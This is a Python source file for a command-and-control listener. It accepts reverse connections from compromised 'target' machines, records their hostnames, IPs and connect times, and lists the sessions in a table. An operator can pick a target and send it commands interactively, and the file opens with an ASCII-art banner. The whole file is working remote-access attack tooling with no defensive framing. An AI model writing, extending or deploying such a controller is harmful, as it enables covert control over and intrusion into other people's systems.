import socket
import sys
import threading
from prettytable import PrettyTable
import time
from datetime import datetime


def listener_handler(host_ip, host_port):
    sock.bind((host_ip, host_port))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=communication_handler)
    t1.start()

def target_comm_channel(target_id):
    while True:
        message = input('send message#> ')
        communication_out(target_id, message)
        if message == 'exit':
            target_id.send(message.encode())
            target_id.close()
            break
        if message == 'background':
            break
        else:
            response = communication_in(target_id)
            if response == 'exit':
                print('[-] The client has terminated the session.')
                target_id.close()
                break

            print(response)

def communication_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            current_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {current_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record])
                print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
            else:
                targets.append([remote_target, remote_ip[0], time_record])
                print(f'\n[+] Connection recieved from {remote_ip[0]}\n' + 'Enter command#> ', end="")
        except:
            pass


def communication_in(target_id):
    print('[+] Awaiting response...')
    response = target_id.recv(1024).decode()
    return response


def communication_out(target_id, message):
    message = str(message)
    target_id.send(message.encode())


def banner():
    print('                                                                                                                                                           _..._                   ')
    print('                                 _______                                                         _______                                                .-\'_..._\'\'.     .-\'\'-.     ')
    print('             .                   \  ___ `\'.                                /|                .--.\  ___ `\'.                 __.....__                 .\' .\'      \'.\  .\' .-.  )    ')
    print('           .\'|                    \' |--.\  \                        _     _||                |__| \' |--.\  \    .--./)  .-\'\'         \'.              / .\'            / .\'  / /     ')
    print('          <  |                    | |    \  \'     .-\'\'` \'\'-.  /\    \\\\   //||        .-,.--. .--. | |    \  \'  /.\'\'\\\\  /     .-\'\'"\'-.  `.           . \'             (_/   / /      ')
    print('           | |             __     | |     |  \'  .\'          \'.`\\\\  //\\\\ // ||  __    |  .-. ||  | | |     |  \'| |  | |/     /________\   \          | |                  / /       ')
    print('       _   | | .\'\'\'-.   .:--.\'.   | |     |  | /              ` \`//  \\\'/  ||/\'__ \'. | |  | ||  | | |     |  | \`-\' / |                  |          | |                 / /        ')
    print('     .\' |  | |/.\'\'\'. \ / |   \ |  | |     \' .\'\'                \' \|   |/   |:/`  \'. \'| |  | ||  | | |     \' .\' /("\'`  \    .-------------\'          . \'                . \'         ')
    print('    .   | /|  /    | | `" __ | |  | |___.\' /\' |         .-.    |  \'        ||     | || |  \'- |  | | |___.\' /\'  \ \'---. \    \'-.____...---.           \ \'.          .  / /    _.-\') ')
    print('  .\'.\'| |//| |     | |  .\'.\'\'| | /_______.\'/  .        |   |   .           ||\    / \'| |     |__|/_______.\'/    /\'""\'.\ `.             .\'             \'. `._____.-\'/.\' \'  _.\'.-\'\'  ')
    print('.\'.\'.-\'  / | |     | | / /   | |_\_______|/    .       \'._.\'  /            |/\\\'..\' / | |         \\_______|/    ||     ||  `\'\'-...... -\'                 `-.______ //  /.-\'_.\'      ')
    print('.\'   \_.\'  | \'.    | \'.\ \._,\ \'/               \'._         .\'             \'  `\'-\'`  |_|                       \\\'. __//                                          `/    _.\'         ')
    print('           \'---\'   \'---\'`--\'  `"                   \'-....-\'`                                                    `\'---\'                                           ( _.-\'            ')


if __name__ == '__main__':
    banner()
    targets = []
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])
    except IndexError:
        print('[-] Command line argument(s) missing.  Please try again.')
    except Exception as e:
        print(e)

    listener_handler(host_ip, host_port)
    while True:
        try:
            command = input('Enter command#> ')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Target']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, target[1]])
                        session_counter += 1
                    print(myTable)
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    target_id = (targets[num])[0]
                    target_comm_channel(target_id)
        except KeyboardInterrupt:
            print('\n[+] Keyboard interrupt issued.')
            kill_flag = 1
            sock.close()
            break